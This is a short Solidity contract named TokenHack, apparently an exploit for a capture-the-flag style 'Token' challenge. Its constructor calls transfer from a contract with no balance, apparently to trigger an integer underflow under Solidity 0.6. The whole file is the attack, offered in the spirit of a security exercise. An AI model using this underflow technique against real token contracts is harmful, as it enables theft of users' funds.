// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Token.sol";

contract TokenHack {
    Token public token;

    constructor(address _token) public {
        token = Token(_token);
        token.transfer(msg.sender, 1);
    }
}